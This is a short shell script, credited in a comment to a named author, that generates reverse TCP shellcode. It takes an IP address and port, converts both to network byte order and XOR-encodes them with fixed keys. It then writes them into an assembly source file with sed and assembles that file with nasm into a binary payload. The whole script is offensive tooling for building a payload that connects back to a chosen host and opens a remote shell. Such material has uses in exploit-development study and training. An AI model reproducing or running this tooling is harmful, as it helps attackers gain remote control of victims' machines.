#! /bin/sh

# Utility script written by - Vikrant Navalgund

SOURCE_FILE=$1
IP_ADDR=$2
PORT_NO=$3

XOR_KEY=0x49534855
XOR_KEY_SHORT=0x494E

echo "\n[+] Generating reverse tcp shellcode - Host: $IP_ADDR and Port: $PORT_NO \n"
 
HTON_IP_ADDR="0x"$(printf '%02x' $(echo $IP_ADDR | tr '.' ' ') | tac -rs ..)
HTON_IP_ADDR=$(printf '%#x\n' "$(($HTON_IP_ADDR ^ $XOR_KEY))")
HTON_PORT_NO="0x"$(printf '%04x' $3 | tac -rs ..)
HTON_PORT_NO=$(printf '%#x\n' "$(($HTON_PORT_NO ^ $XOR_KEY_SHORT))")

sed -i "s/\(HTON_PORT_NO \)\(.*\)/\1${HTON_PORT_NO}/" ${SOURCE_FILE}
sed -i "s/\(HTON_IP_ADDR \)\(.*\)/\1${HTON_IP_ADDR}/" ${SOURCE_FILE}
nasm -f bin ${SOURCE_FILE} -o ${SOURCE_FILE%.*}.bin

